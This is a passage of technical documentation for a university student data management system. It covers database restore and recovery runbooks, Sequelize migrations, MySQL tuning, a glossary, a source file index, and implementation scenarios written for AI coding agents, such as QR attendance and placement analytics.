    Admin->>MySQL: Execute Integrity Verification Queries
    Admin->>App: Restart Backend Processes (pm2 start all)
    App-->>Admin: Health Check HTTP 200 OK
```

### 13.2.1 Step-by-Step Restoration Protocol
1. **Quarantine Application**: Terminate all application listeners to prevent inconsistent concurrent writes during restoration:
   ```bash
   pm2 stop gbu-sdms-api
   ```
2. **Recreate Clean Schema**:
   ```sql
   DROP DATABASE IF EXISTS gbu_sdms_db;
   CREATE DATABASE gbu_sdms_db CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
   ```
3. **Stream Restore Base Backup**:
   ```bash
   gunzip -c /var/backups/sdms/mysql/gbu_sdms_db_latest.sql.gz | mysql -u sdms_user -p gbu_sdms_db
   ```
4. **Point-In-Time Binary Log Replay**:
   To recover transactions committed between the 02:00 UTC dump and the incident timestamp (e.g., 10:45:00 UTC):
   ```bash
   mysqlbinlog --start-datetime="2026-09-05 02:00:00" \
               --stop-datetime="2026-09-05 10:45:00" \
               /var/log/mysql/binlog.0000* | mysql -u sdms_user -p gbu_sdms_db
   ```
5. **Data Consistency Audit**: Verify that key counts match expected values:
   ```sql
   SELECT COUNT(*) AS total_students FROM students;
   SELECT COUNT(*) AS total_users FROM users;
   SELECT COUNT(*) AS total_attendance_sessions FROM attendance_sessions;
   ```
6. **Resume Service**:
   ```bash
   pm2 restart gbu-sdms-api
   curl -I http://localhost:5000/api/health
   ```

---

## 13.3 Zero-Downtime Schema Migration Architecture

GBU-SDSM handles relational database evolution using the **Expand and Contract (Parallel Run)** migration pattern, ensuring that schema updates never cause application downtime or API incompatibilities.

```mermaid
flowchart TD
    subgraph Phase1["Phase 1: Expand (Non-Breaking Additions)"]
        A[Add New Columns with NULL / Defaults] --> B[Deploy Code Supporting Both Schemas]
    end

    subgraph Phase2["Phase 2: Transition (Dual-Writing)"]
        B --> C[Backend Reads New Column, Falls Back to Old]
        C --> D[Backend Writes Synchronously to Both Columns]
    end

    subgraph Phase3["Phase 3: Backfill (Background Data Migration)"]
        D --> E[Batch Script Migrates Legacy Rows]
        E --> F[Verify 100% Data Equivalence]
    end

    subgraph Phase4["Phase 4: Contract (Retire Legacy Columns)"]
        F --> G[Deploy Code Reading Exclusively from New Columns]
        G --> H[Drop Obsolete Columns via ALTER TABLE DROP]
    end
```

### 13.3.1 Sequelize Migration Example: Adding Internship & Placement Columns
The migration script below illustrates how the 8 career timeline columns were integrated without locking the database:
```javascript
'use strict';

module.exports = {
  up: async (queryInterface, Sequelize) => {
    const transaction = await queryInterface.sequelize.transaction();
    try {
      await queryInterface.addColumn('students', 'internshipCompany', {
        type: Sequelize.STRING(255),
        allowNull: true,
        defaultValue: null
      }, { transaction });

      await queryInterface.addColumn('students', 'internshipDoj', {
        type: Sequelize.DATEONLY,
        allowNull: true,
        defaultValue: null
      }, { transaction });

      await queryInterface.addColumn('students', 'internshipDoe', {
        type: Sequelize.DATEONLY,
        allowNull: true,
        defaultValue: null
      }, { transaction });

      await queryInterface.addColumn('students', 'internshipIsPaid', {
        type: Sequelize.BOOLEAN,
        allowNull: false,
        defaultValue: false
      }, { transaction });

      await queryInterface.addColumn('students', 'internshipStipend', {
        type: Sequelize.STRING(100),
        allowNull: true,
        defaultValue: null
      }, { transaction });

      await queryInterface.addColumn('students', 'placementCompany', {
        type: Sequelize.STRING(255),
        allowNull: true,
        defaultValue: null
      }, { transaction });

      await queryInterface.addColumn('students', 'placementDoj', {
        type: Sequelize.DATEONLY,
        allowNull: true,
        defaultValue: null
      }, { transaction });

      await queryInterface.addColumn('students', 'placementIsPaid', {
        type: Sequelize.BOOLEAN,
        allowNull: false,
        defaultValue: true
      }, { transaction });

      // Add performance index on placement status for placement analytics
      await queryInterface.addIndex('students', ['placed', 'placementCompany'], {
        name: 'idx_students_placement_status',
        transaction
      });

      await transaction.commit();
    } catch (error) {
      await transaction.rollback();
      throw error;
    }
  },

  down: async (queryInterface, Sequelize) => {
    const transaction = await queryInterface.sequelize.transaction();
    try {
      await queryInterface.removeIndex('students', 'idx_students_placement_status', { transaction });
      await queryInterface.removeColumn('students', 'internshipCompany', { transaction });
      await queryInterface.removeColumn('students', 'internshipDoj', { transaction });
      await queryInterface.removeColumn('students', 'internshipDoe', { transaction });
      await queryInterface.removeColumn('students', 'internshipIsPaid', { transaction });
      await queryInterface.removeColumn('students', 'internshipStipend', { transaction });
      await queryInterface.removeColumn('students', 'placementCompany', { transaction });
      await queryInterface.removeColumn('students', 'placementDoj', { transaction });
      await queryInterface.removeColumn('students', 'placementIsPaid', { transaction });
      await transaction.commit();
    } catch (error) {
      await transaction.rollback();
      throw error;
    }
  }
};
```

---

## 13.4 MySQL Database Engine Performance Tuning (`my.cnf`)

For production workloads supporting thousands of concurrent students, faculty, and administrative staff, the default MySQL 8.0 configuration must be tuned for optimal memory utilization, cache hit ratios, and concurrency throughput.

```ini
[mysqld]
# Network & General
bind-address                   = 127.0.0.1
port                           = 3306
default_storage_engine         = InnoDB
character-set-server           = utf8mb4
collation-server               = utf8mb4_unicode_ci
max_connections                = 500
max_connect_errors             = 10000
wait_timeout                   = 600
interactive_timeout            = 600

# InnoDB Buffer Pool Tuning (Crucial for high performance)
# Dedicated server: Set to 70-80% of total physical RAM
innodb_buffer_pool_size        = 4G
innodb_buffer_pool_instances  = 4
innodb_log_file_size           = 512M
innodb_log_buffer_size         = 64M
innodb_flush_log_at_trx_commit = 2       # Optimal performance for ACID write spikes
innodb_flush_method            = O_DIRECT
innodb_file_per_table          = 1
innodb_stats_on_metadata       = 0

# Threading & Memory Optimization
thread_cache_size              = 64
table_open_cache               = 4096
table_definition_cache         = 2048
sort_buffer_size               = 4M
read_rnd_buffer_size           = 8M
join_buffer_size               = 4M
tmp_table_size                 = 64M
max_heap_table_size            = 64M

# Binary Logging & Disaster Recovery
log_bin                        = /var/log/mysql/mysql-bin.log
binlog_format                  = ROW
binlog_expire_logs_seconds     = 604800  # 7-day binary log retention
max_binlog_size                = 256M

# Slow Query Diagnostics
slow_query_log                 = 1
slow_query_log_file            = /var/log/mysql/mysql-slow.log
long_query_time                = 1.0     # Log queries exceeding 1 second
log_queries_not_using_indexes  = 0
```

---

## 13.5 Autonomous AI Troubleshooting & Diagnostics Playbook

When an autonomous AI agent encounters operational anomalies during monitoring or self-healing routines, it must execute the diagnostic decision trees outlined below.

### 13.5.1 Diagnostic Playbook 1: Backend Latency Spike / Process Unresponsiveness
1. **Inspect System Resources**:
   - Check CPU and Memory utilization via `top` or `pm2 monit`.
   - If Node process memory exceeds 1 GB: Trigger PM2 graceful reload (`pm2 reload gbu-sdms-api`).
2. **Inspect Slow Query Logs**:
   - Run: `tail -n 100 /var/log/mysql/mysql-slow.log`.
   - Identify unindexed queries. If full table scans occur on `students`, verify that composite index `(program, branch, section)` is active.

### 13.5.2 Diagnostic Playbook 2: Sequelize Connection Pool Exhaustion
- **Symptom**: Error log reports `SequelizeConnectionAcquireTimeoutError: Operation timeout`.
- **Root Cause**: Database connections held open by uncommitted transactions or slow blocking queries.
- **Remedy**:
  1. Inspect active MySQL threads:
     ```sql
     SHOW FULL PROCESSLIST;
     ```
  2. Kill runaway queries blocking table locks.
  3. Increase `DB_POOL_MAX` in `backend/.env` from `10` to `25`.
  4. Ensure all controller code wraps database transactions in managed transaction callbacks (`sequelize.transaction(async t => { ... })`) so rollbacks execute automatically on errors.

### 13.5.3 Diagnostic Playbook 3: Cross-Origin Resource Sharing (CORS) Rejection
- **Symptom**: Browser console displays *"Access to XMLHttpRequest blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present"*.
- **Root Cause**: Client request sent from an origin not registered in `CLIENT_URL` or reverse proxy stripping headers.
- **Remedy**:
  1. Inspect `Origin` header in incoming request.
  2. Append client origin to `corsOptions.origin` array in `backend/server.js`.
  3. Verify Nginx configuration forwards `Host` and `X-Forwarded-Proto` correctly.



---

# SECTION 14: Master Technical Glossary, File-by-File Codebase Index & Autonomous Agent Operational Protocol

This final section serves as the definitive reference lexicon and source file directory for Gautam Buddha University Student Data Management System (GBU-SDSM). It provides comprehensive definitions for academic and technical terminology, an exhaustive file-by-file index of every source artifact in the repository, and non-negotiable architectural invariants for autonomous engineering agents.

---

## 14.1 Comprehensive Technical Glossary & Domain Lexicon

| Term / Acronym | Classification | Formal Technical Definition & Operational Context in GBU-SDSM |
| :--- | :--- | :--- |
| **ACID** | Database Architecture | Atomicity, Consistency, Isolation, Durability. The four foundational transaction properties guaranteed by MySQL InnoDB engine and utilized via Sequelize managed transactions (`sequelize.transaction`) to ensure multi-table writes succeed or fail atomically. |
| **Bcrypt** | Cryptography | A Blowfish-based adaptive key derivation function designed by Niels Provos and David Mazières. Utilized with a work factor of 10 salt rounds to hash all user authentication passwords prior to database persistence. |
| **BOLA / IDOR** | Cybersecurity | Broken Object Level Authorization / Insecure Direct Object Reference. An access control flaw where an application uses user-supplied input to access an object directly without validating that the user is authorized for that specific resource. GBU-SDSM mitigates BOLA by enforcing mandatory tenancy scope filters (e.g., matching coordinator program/branch/section). |
| **CategoryView** | UI Component | A structured presentation component within the student details view that divides comprehensive student records into distinct visual sections: Personal, Contact, Academic, and Career/Placement. |
| **CORS** | Network Security | Cross-Origin Resource Sharing. A W3C mechanism using HTTP headers to tell browsers whether a web application running at one origin has permission to access resources from a server at a different origin. Configured in `server.js` with explicit origin whitelisting and `credentials: true`. |
| **CSP** | Network Security | Content Security Policy. An HTTP response header (`Content-Security-Policy`) enforced via Helmet middleware that restricts the sources from which scripts, styles, images, and frames can be loaded, preventing Cross-Site Scripting (XSS). |
| **CSRF** | Cybersecurity | Cross-Site Request Forgery. An attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated. GBU-SDSM prevents CSRF by requiring custom `Authorization: Bearer` headers for state-changing API operations. |
| **Defaulter** | Academic Domain | A student whose cumulative attendance percentage falls below the mandatory institutional threshold of 75.0%. Defaulters are highlighted in yellow/red on dashboards and are debarred from sitting for end-semester examinations unless granted formal administrative condonation. |
| **Dual-Token Engine**| Authentication | An authentication pattern combining short-lived Access Tokens (15-minute lifespan, stored in memory or client state) with long-lived Refresh Tokens (7-day lifespan, stored in HttpOnly, Secure, SameSite=Strict cookies) to balance high security with seamless user sessions. |
| **Enrollment Number**| Academic Domain | A unique 10-digit institutional identifier assigned to every matriculated student at Gautam Buddha University (e.g. `2500100481`). Serves as the primary immutable identifier across student dossiers, academic records, and login identifiers. |
| **FacultyAssignment**| Relational Entity | A database mapping table linking a specific instructor (`facultyId`) to a course subject (`subjectId`), academic program, branch, semester, and section, establishing instructor authority to mark class attendance and message students. |
| **Fuzzy Header Matching**| Data Engineering | A heuristic algorithm that normalizes spreadsheet column headers by stripping non-alphanumeric characters, lowercasing, and matching against an alias dictionary to automate student enrollment ingestion. |
| **HSTS** | Network Security | HTTP Strict Transport Security. An HTTP response header informing browsers that the site must only be accessed using HTTPS, preventing SSL-stripping man-in-the-middle attacks. Configured with a 1-year max-age. |
| **JWT** | Authentication | JSON Web Token (RFC 7519). A compact, URL-safe means of representing claims to be transferred between two parties. Signed using HMAC SHA-256 (`HS256`) parameterized by `JWT_SECRET`. |
| **Lateral Entry** | Academic Domain | An admission pathway whereby students holding an accredited 3-year engineering diploma or B.Sc. degree enter directly into the second year (3rd semester) of a four-year B.Tech program. |
| **Multer** | Middleware | Node.js middleware for handling `multipart/form-data` primarily used for uploading student spreadsheets and photographs. Configured with memory storage for zero-disk-leak spreadsheet parsing. |
| **OTP** | Security | One-Time Password. A 6-digit numeric cryptographic code generated via `crypto.randomInt` with a 10-minute expiration TTL used for password recovery workflows. |
| **PITR** | Infrastructure | Point-In-Time Recovery. The process of restoring a database to an exact historical timestamp by combining a full logical snapshot with incremental MySQL binary transaction logs. |
| **RBAC** | Authorization | Role-Based Access Control. An access governance mechanism that restricts system operations to authorized users based on their assigned role (`admin`, `chairperson`, `coordinator`, `faculty`, `student`). |
| **Redux Toolkit (RTK)**| Frontend Architecture | The official, opinionated toolset for efficient Redux state development. Powers application state slices (`adminSlice`, `userSlice`) with immutable state updates via Immer. |
| **SameSite Cookie** | Web Security | A cookie attribute instructing browsers whether cookies should be sent with cross-site requests. GBU-SDSM configures `SameSite=Strict` on refresh tokens to prevent cross-site exfiltration. |
| **Sequelize** | ORM | A promise-based Node.js Object-Relational Mapping library for MySQL that manages relational models, associations, migrations, lifecycle hooks, and parameterized queries. |
| **SheetJS (xlsx)** | Data Processing | A high-performance JavaScript spreadsheet parser and builder utilized in GBU-SDSM for both server-side bulk Excel ingestion and client-side data exports. |
| **SPA** | Web Architecture | Single Page Application. A web application architecture that interacts with the user by dynamically rewriting the current web page with data from the API server rather than loading entire new pages from the server. |
| **Tailwind CSS** | Styling Engine | A utility-first CSS framework providing responsive classes, color tokens, typography scales, and UI consistency across all GBU-SDSM portals. |
| **Tenancy Isolation**| Architecture | Logical partitioning of relational data ensuring that batch coordinators and faculty members can only read and mutate records belonging to their assigned classes and sections. |
| **Token Rotation** | Security | A security practice where every invocation of the refresh endpoint issues both a new access token and a brand-new refresh token while invalidating the old refresh token. |
| **Vite** | Build Tool | A frontend build tool that leverages native ES modules in development for instant server start and Rollup for production bundle optimization. |

---

## 14.2 Master Source File Index & Component Mapping

### 14.2.1 Backend Server & Middleware Architecture (`backend/`)
- **`server.js`**: Express application entry point; initializes HTTP listener, registers Helmet, CORS, body parsers, rate limiters, static file routes, API router mounts, and centralized error handler.
- **`config/database.js`**: Initializes Sequelize connection instance, configures connection pool parameters (`max`, `min`, `acquire`, `idle`), and exports database connection handle.
- **`middleware/authMiddleware.js`**: JWT verification middleware; extracts Bearer token, validates signature, looks up active user record, and populates `req.user`.
- **`middleware/roleMiddleware.js`**: Role authorization middleware factory; enforces role membership (`verifyRole`) and tenancy boundary constraints.
- **`middleware/rateLimiter.js`**: Express rate limiters for general API traffic (500 requests / 15 min) and authentication endpoints (10 requests / 15 min).
- **`middleware/securityHeaders.js`**: Helmet security headers configuration (CSP, X-Frame-Options, HSTS, nosniff).
- **`middleware/requestLogger.js`**: UUIDv4 correlation ID generator and HTTP request latency auditor.
- **`middleware/multerUpload.js`**: Memory and disk storage engines for file uploads with MIME filtering and size caps.

### 14.2.2 Backend Relational Models (`backend/models/`)
- **`User.js`**: Core identity model; stores email, username, enrollmentNo, password hash, role, status flags, OTP tokens, and token versions.
- **`Student.js`**: Comprehensive student record; demographic fields, academic parameters, category, address, and the 8 new internship and placement attributes.
- **`Coordinator.js`**: Academic batch coordinator; stores user foreign key, department, assigned program, branch, and section.
- **`Chairperson.js`**: Departmental executive model; maps user to departmental jurisdiction.
- **`ChairpersonClass.js`**: Junction table mapping Chairpersons to multiple academic classes and sections.
- **`Faculty.js`**: Faculty profile; employee code, designation, department, contact details.
- **`FacultyAssignment.js`**: Relational binding mapping faculty members to course subjects and class sections.
- **`AttendanceSession.js`**: Class attendance session header; subject, instructor, date, slot, session type, lock status.
- **`AttendanceRecord.js`**: Individual student attendance status row (`Present`, `Absent`, `Late`, `Excused`) for a session.
- **`Course.js` / `Subject.js`**: Course catalog; course name, code, credits, lecture/lab type, semester.
- **`Timetable.js`**: Weekly class schedule matrix mapping days, time slots, courses, venues, and instructors.
- **`Message.js`**: Inter-user and broadcast communications ledger.
- **`AuditLog.js`**: Immutable security audit trail recording administrative actions, overrides, and timestamps.

### 14.2.3 Backend API Controllers (`backend/controllers/`)
- **`authController.js`**: Authentication workflows: login, logout, me, refresh token, forgot password, OTP verification, reset password.
- **`studentController.js`**: Student management: query, filter, single create, update, delete, bulk upload, bulk edit, CSV export.
- **`coordinatorController.js`**: Coordinator scoped operations: class dashboard, class student roster, scoped single edit, scoped bulk edit.
- **`chairpersonController.js`**: Departmental management: cross-program metrics, class overview, faculty assignments, departmental student search.
- **`facultyController.js`**: Faculty operations: assigned classes, teaching schedule, student rosters, profile management.
- **`attendanceController.js`**: Attendance engine: session creation, atomic record marking, 24h edits, session locking, administrative overrides, percentage calculations.
- **`messageController.js`**: Communication engine: inbox queries, direct messaging, class broadcast, universal notification dispatch.
- **`timetableController.js`**: Timetable schedule retrieval and grid management.

### 14.2.4 Frontend Single Page Application (`frontend/src/`)
- **`App.tsx`**: Root router architecture; configures public, auth, and role-guarded portal routes.
- **`main.tsx`**: React DOM root mounting, Redux Provider binding, global style loading.
- **`store/index.ts`**: Redux Toolkit store initialization with typed hooks.
- **`store/adminSlice.ts`**: Administrative state slice managing student records, statistics, and filters.
- **`store/userSlice.ts`**: Authentication state slice managing session tokens, role, and current profile.
- **`utils/api.ts`**: Axios singleton with request token injector and response 401 refresh interceptor.
- **`types/types.ts`**: Canonical TypeScript type definitions and interfaces for all domain entities.
- **`constants/index.ts`**: Master university academic hierarchy (Schools, Departments, Programs, Degrees).

---

## 14.3 Common Developer & AI Agent Command Reference

| Operational Task | Shell / Terminal Command | Expected Output & Impact |
| :--- | :--- | :--- |
| **Install Backend Dependencies** | `cd backend && npm install` | Installs production and development Node.js packages into `node_modules`. |
| **Install Frontend Dependencies**| `cd frontend && npm install` | Installs Vite, React, Redux Toolkit, and Tailwind dependencies. |
| **Launch Backend Dev Server** | `cd backend && npm run dev` | Starts Express listener on `http://localhost:5000` with nodemon live-reloading. |
| **Launch Frontend Dev Server** | `cd frontend && npm run dev` | Starts Vite dev server on `http://localhost:5173` with Hot Module Replacement. |
| **Execute Database Migrations** | `cd backend && npx sequelize-cli db:migrate` | Applies pending database migrations to the configured MySQL schema. |
| **Rollback Last Migration** | `cd backend && npx sequelize-cli db:migrate:undo` | Reverts the most recent migration file transactionally. |
| **Run Production Frontend Build** | `cd frontend && npm run build` | Compiles TypeScript and produces optimized static bundle in `frontend/dist/`. |
| **PM2 Production Process Start** | `pm2 start ecosystem.config.js --env production` | Launches clustered Node.js API processes under daemon supervision. |
| **Inspect Production API Logs** | `pm2 logs gbu-sdms-api --lines 100` | Displays live streaming stdout and stderr log output. |
| **PM2 Zero-Downtime Reload** | `pm2 reload gbu-sdms-api --update-env` | Gracefully reloads worker processes sequentially without dropping active connections. |
| **Database Connection Test** | `mysqladmin -u sdms_user -p ping` | Verifies that the MySQL server daemon is responsive (`mysqld is alive`). |

---

## 14.4 Non-Negotiable Architectural Invariants for Autonomous AI Agents

When future autonomous AI agents (such as Google Antigravity or peer coding agents) are tasked with maintaining, extending, or refactoring GBU-SDSM, they must strictly comply with these seven core architectural invariants:

1. **Strict Tenancy Scoping on All Coordinator & Faculty Endpoints**:
   Never allow a coordinator to query, view, or modify students outside their assigned program, branch, and section. All Sequelize queries for coordinators must include the scope filter.
2. **Atomic Multi-Table Transactions**:
   Any operation modifying more than one relational table (e.g. creating student + user accounts, or creating attendance sessions + attendance records) must be executed inside a managed `sequelize.transaction()`. Never commit partial writes.
3. **In-Memory Buffer Streaming for Spreadsheets**:
   Never write uploaded Excel spreadsheets to disk. Always ingest files into memory via Multer and parse directly via `xlsx.read(buffer)` to avoid temporary file accumulation and disk leaks.
4. **Preservation of the 8 Career / Placement Schema Columns**:
   Never alter or remove `internshipCompany`, `internshipDoj`, `internshipDoe`, `internshipIsPaid`, `internshipStipend`, `placementCompany`, `placementDoj`, or `placementIsPaid` without executing an explicit, non-destructive migration.
5. **No Route-Redirect Disruption on In-Place Edits**:
   Maintain in-place modal/drawer editing experiences (using `StudentForm.tsx` and stopping event propagation with `e.stopPropagation()`) to ensure that coordinators and admins are never redirected back to dashboards when editing records.
6. **Double-Layered Defense on Passwords & Tokens**:
   Never store plaintext passwords; always salt with bcrypt at work factor 10. Store refresh tokens exclusively in `HttpOnly`, `Secure`, `SameSite=Strict` cookies.
7. **Comprehensive Error Redaction in Production**:
   Ensure that `NODE_ENV === 'production'` prevents stack traces or raw database error messages from leaking to client browsers.



---

# SECTION 15: Autonomous AI Agent Execution Scenarios & Comprehensive Code Modification Runbooks

This section provides explicit, step-by-step implementation playbooks designed specifically for autonomous AI coding agents (such as Google Antigravity, Devin, Claude Engineer, or OpenAI Codex). It walks through complex end-to-end development scenarios, demonstrating exactly which files to edit, which database migrations to run, and how to verify system stability.

---

## 15.1 Autonomous AI Agent Persona & Operational Protocols

When an autonomous AI agent is initialized to maintain, refactor, or enhance the GBU-SDSM codebase, the agent must adhere to the following behavioral and cognitive directives:

```mermaid
flowchart TD
    Init[Agent Task Ingestion] --> Audit[Codebase & Database Audit]
    Audit --> Plan[Formulate Step-by-Step Implementation Plan]
    Plan --> CheckScope[Verify Tenancy & RBAC Boundaries]
    CheckScope --> Migrate[Execute Non-Destructive Migrations]
    Migrate --> BackendMod[Implement Backend Controllers & Models]
    BackendMod --> FrontMod[Update TypeScript Interfaces & React Components]
    FrontMod --> TestVerify[Execute Unit, Integration & QA Suites]
    TestVerify --> VerifyLogs[Inspect Server Logs & Confirm Zero Regressions]
    VerifyLogs --> Done[Deliver Verified Task Artifacts]
```

1. **Non-Destructive Database Modifications**: Always write backward-compatible Sequelize migrations. Never drop existing columns without a four-phase expand-and-contract migration cycle.
2. **Strict Static Typing**: When adding new attributes or domain entities, update the canonical TypeScript interfaces in `frontend/src/types/types.ts` first, ensuring no compile-time type errors (`tsc --noEmit`).
3. **Preservation of Core Bug Fixes**: Always retain event propagation stops (`e.stopPropagation()`) in table action buttons, keep in-place modal drawers rather than route transitions for edits, preserve the 8 career timeline columns, and maintain fuzzy spreadsheet header matching.

---

## 15.2 Scenario 1: Implementing a New Academic Program (M.Sc. in Data Science)

### 15.2.1 Objective
Introduce a new postgraduate degree program, **Master of Science in Data Science (M.Sc. DS)**, under the School of Information and Communication Technology (SOICT), Department of Computer Science and Engineering (CSE), with sections A and B across 4 academic semesters.

### 15.2.2 Step 1: Update Frontend University Hierarchy Constants
Navigate to `frontend/src/constants/index.ts` and locate the `cse` program array. Append the new program definition:
```typescript
// frontend/src/constants/index.ts
export const cse: Program[] = [
  { _id: '1', code: 'btech', name: 'B.Tech' },
  { _id: '2', code: 'mtech', name: 'M.Tech' },
  { _id: '3', code: 'int', name: 'B.Tech + M.Tech' },
  { _id: '4', code: 'phd', name: 'Ph.D.' },
  { _id: '5', code: 'msc_ds', name: 'M.Sc. (Data Science)' } // [NEW PROGRAM ENTRY]
];
```

### 15.2.3 Step 2: Update Backend Validation Schema
Navigate to `backend/validators/studentValidator.js` and ensure the program whitelist accepts the new program identifier:
```javascript
const validPrograms = [
  'B.Tech',
  'M.Tech',
  'B.Tech + M.Tech',
  'BCA',
  'MCA',
  'MBA',
  'Ph.D.',
  'M.Sc. (Data Science)' // [NEW WHITELIST ENTRY]
];
```

### 15.2.4 Step 3: Seed Default Course Catalog
Create a Sequelize seed script (`backend/seeders/20260905-seed-msc-ds-courses.js`) to populate foundational courses:
```javascript
'use strict';

module.exports = {
  up: async (queryInterface) => {
    return queryInterface.bulkInsert('subjects', [
      {
        name: 'Advanced Statistical Methods for Data Science',
        code: 'DS501',
        credits: 4,
        type: 'theory',
        semester: 1,
        program: 'M.Sc. (Data Science)',
        createdAt: new Date(),
        updatedAt: new Date()
      },
      {
        name: 'Deep Learning & Neural Architectures',
        code: 'DS503',
        credits: 4,
        type: 'theory',
        semester: 1,
        program: 'M.Sc. (Data Science)',
        createdAt: new Date(),
        updatedAt: new Date()
      },
      {
        name: 'Data Engineering & Cloud Pipelines Lab',
        code: 'DS505',
        credits: 2,
        type: 'lab',
        semester: 1,
        program: 'M.Sc. (Data Science)',
        createdAt: new Date(),
        updatedAt: new Date()
      }
    ]);
  },

  down: async (queryInterface) => {
    return queryInterface.bulkDelete('subjects', { program: 'M.Sc. (Data Science)' });
  }
};
```
Execute the seed script:
```bash
cd backend && npx sequelize-cli db:seed --seed 20260905-seed-msc-ds-courses.js
```

---

## 15.3 Scenario 2: Adding QR Code Attendance Marking Mode

### 15.3.1 Objective
Empower instructors to display a dynamic, time-sensitive QR code on the lecture hall projector that enrolled students scan via mobile camera to record their own attendance with cryptographic proof of physical classroom presence.

### 15.3.2 Step 1: Database Migration for QR Attendance Tokens
Create a new migration (`backend/migrations/20260905-add-qr-token-to-attendance-sessions.js`):
```javascript
'use strict';

module.exports = {
  up: async (queryInterface, Sequelize) => {
    await queryInterface.addColumn('attendance_sessions', 'qrSessionToken', {
      type: Sequelize.STRING(255),
      allowNull: true,
      defaultValue: null
    });
    await queryInterface.addColumn('attendance_sessions', 'qrTokenExpiresAt', {
      type: Sequelize.DATE,
      allowNull: true,
      defaultValue: null
    });
    await queryInterface.addColumn('attendance_records', 'verificationMethod', {
      type: Sequelize.ENUM('manual', 'qr_scan', 'biometric', 'rfid'),
      allowNull: false,
      defaultValue: 'manual'
    });
  },

  down: async (queryInterface) => {
    await queryInterface.removeColumn('attendance_sessions', 'qrSessionToken');
    await queryInterface.removeColumn('attendance_sessions', 'qrTokenExpiresAt');
    await queryInterface.removeColumn('attendance_records', 'verificationMethod');
  }
};
```

### 15.3.3 Step 2: Backend Dynamic QR Generator & Verification Controller
Add to `backend/controllers/attendanceController.js`:
```javascript
const crypto = require('crypto');

// Generate 30-second rotating QR token
exports.generateSessionQrToken = async (req, res) => {
  const { sessionId } = req.params;
  const session = await AttendanceSession.findByPk(sessionId);
  if (!session) return res.status(404).json({ success: false, message: "Session not found" });

  const randomToken = crypto.randomBytes(32).toString('hex');
  session.qrSessionToken = randomToken;
  session.qrTokenExpiresAt = new Date(Date.now() + 30 * 1000); // 30-second TTL
  await session.save();

  return res.json({
    success: true,
    token: randomToken,
    expiresAt: session.qrTokenExpiresAt
  });
};

// Student scans QR and submits token
exports.claimQrAttendance = async (req, res) => {
  const { sessionId, token } = req.body;
  const student = await Student.findOne({ where: { userId: req.user.id } });
  if (!student) return res.status(403).json({ success: false, message: "Only enrolled students can scan" });

  const session = await AttendanceSession.findByPk(sessionId);
  if (!session) return res.status(404).json({ success: false, message: "Session not found" });

  if (session.qrSessionToken !== token || new Date() > session.qrTokenExpiresAt) {
    return res.status(400).json({ success: false, message: "QR token expired or invalid" });
  }

  // Upsert attendance record
  await AttendanceRecord.upsert({
    sessionId: session.id,
    studentId: student.id,
    status: 'Present',
    verificationMethod: 'qr_scan',
    remarks: 'Verified via dynamic classroom QR scan'
  });

  return res.json({ success: true, message: "Attendance recorded successfully" });
};
```

---

## 15.4 Scenario 3: Building a Departmental Placement Analytics Pipeline

### 15.4.1 Objective
Provide university executives and placement cell officers with aggregated analytics: highest CTC package, average CTC package, placement rate percentage per branch, and top corporate recruiters.

### 15.4.2 SQL Aggregation Engine
Implement analytical queries within `backend/controllers/reportController.js`:
```javascript
exports.getDepartmentPlacementAnalytics = async (req, res) => {
  try {
    const { department, academicYear } = req.query;

    const summaryStats = await sequelize.query(`
      SELECT 
        s.branch,
        COUNT(s.id) AS totalEligible,
        SUM(CASE WHEN s.placed = 1 THEN 1 ELSE 0 END) AS totalPlaced,
        ROUND((SUM(CASE WHEN s.placed = 1 THEN 1 ELSE 0 END) / COUNT(s.id)) * 100, 2) AS placementPercentage,
        MAX(CAST(REGEXP_REPLACE(s.package, '[^0-9.]', '') AS DECIMAL(10,2))) AS highestPackageLPA,
        ROUND(AVG(CASE WHEN s.placed = 1 THEN CAST(REGEXP_REPLACE(s.package, '[^0-9.]', '') AS DECIMAL(10,2)) ELSE NULL END), 2) AS averagePackageLPA
      FROM students s
      WHERE (:department IS NULL OR s.department = :department)
      GROUP BY s.branch
    `, {
      replacements: { department: department || null },
      type: QueryTypes.SELECT
    });

    const topRecruiters = await sequelize.query(`
      SELECT 
        s.company,
        COUNT(s.id) AS offersCount,
        MAX(CAST(REGEXP_REPLACE(s.package, '[^0-9.]', '') AS DECIMAL(10,2))) AS maxOfferedPackage
      FROM students s
      WHERE s.placed = 1 AND s.company IS NOT NULL
      GROUP BY s.company
      ORDER BY offersCount DESC
      LIMIT 10
    `, { type: QueryTypes.SELECT });

    return res.json({
      success: true,
      data: {
        summaryStats,
        topRecruiters
      }
    });
  } catch (error) {
    console.error("Error computing placement analytics:", error);
    return res.status(500).json({ success: false, message: "Internal server error" });
  }
};
```

---

## 15.5 Scenario 4: Automated Database Migration & Rollback Protocol

When schema modifications are required:
1. **Generate Migration Boilerplate**:
   ```bash
   cd backend && npx sequelize-cli migration:generate --name add-fields-to-students
   ```
2. **Implement `up` and `down` Methods**:
   Ensure that every addition in `up` is mirrored by a precise deletion in `down` within an explicit transaction.
3. **Execute Migration in Staging**:
   ```bash
   npx sequelize-cli db:migrate
   ```
4. **Test Rollback Integrity**:
   ```bash
   npx sequelize-cli db:migrate:undo
   ```
   Verify that database schema matches original state before reapplying.
5. **Reapply Migration & Update Models**:
   ```bash
   npx sequelize-cli db:migrate
   ```
   Update corresponding Sequelize model attributes in `backend/models/`.

---

## 15.6 Scenario 5: Production Incident Triage Runbook

When alerted to a production incident (such as unexpected 500 responses or unresponsive APIs):

```
Step 1: Check Process Health
$ pm2 list
Verify process status (online vs errored vs restart count).

Step 2: Inspect Real-Time Error Logs
$ pm2 logs gbu-sdms-api --err --lines 50
Extract stack trace and identify failing module.

Step 3: Correlate Inbound Request ID
Match client error message 'correlationId' with server logs to locate exact request body and parameters.

Step 4: Check Database Connectivity & Pool
$ mysqladmin -u sdms_user -p ping
Inspect active threads: SHOW FULL PROCESSLIST;

Step 5: Apply Code Fix & Execute Zero-Downtime Reload
$ git pull origin main
$ pm2 reload gbu-sdms-api --update-env

Step 6: Run Health Check
$ curl -I https://sdms.gbu.ac.in/api/health
Verify HTTP 200 OK and response latency < 100ms.
```
